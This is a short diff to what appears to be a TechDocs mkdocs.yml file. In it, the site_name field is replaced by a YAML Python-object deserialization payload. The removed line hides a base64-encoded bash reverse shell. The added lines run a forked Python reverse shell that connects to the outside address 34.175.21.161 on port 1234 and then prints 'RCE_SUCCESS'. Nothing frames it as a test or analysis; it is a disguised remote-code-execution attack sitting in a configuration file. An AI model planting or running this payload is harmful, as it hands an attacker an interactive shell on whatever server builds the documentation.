@@ -1,6 +1,15 @@
-site_name: !!python/object/apply:os.system ["echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNzUuMjEuMTYxLzEyMzQgMD4mMQo= | base64 -d | bash"]
+site_name:!!python/object/apply:os.popen
+  - |
+    python3 -c 'import socket,os,subprocess;
+    if os.fork() == 0:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+        s.connect(("34.175.21.161",1234)); 
+        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
+        p=subprocess.call(["/bin/bash","-i"])'
+    echo "RCE_SUCCESS"
 plugins:
   - techdocs-core
+
 
 
 
